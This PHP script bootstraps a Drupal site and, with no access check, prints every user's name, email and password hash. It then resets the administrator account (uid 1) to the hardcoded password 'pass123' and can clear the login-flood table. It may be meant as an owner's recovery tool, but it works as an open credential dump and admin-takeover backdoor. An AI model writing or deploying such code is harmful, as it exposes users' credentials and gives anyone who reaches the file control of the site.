<?php
	/** bootstrap Drupal **/
	define('DRUPAL_ROOT', getcwd());

	require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
	drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
	menu_execute_active_handler();

  $result = db_query("SELECT uid, name, mail, pass, status FROM users");
 
  foreach ($result as $row) {
    echo '<pre>' . print_r($row, 1) . '</pre>';
  }
 $_GET['uid'] = 1;
  if (isset($_GET['uid'])) {
    require './includes/password.inc';
 
    $hash = user_hash_password('pass123');
    db_query("UPDATE users SET pass = :hash, status = 1 WHERE uid = :uid", array(
      ':hash' => $hash,
      ':uid' => (int) $_GET['uid'],
    ));
 
    if (isset($_GET['flood'])) {
      db_query("TRUNCATE flood");
    }
  }
 
  exit();

 
 ?>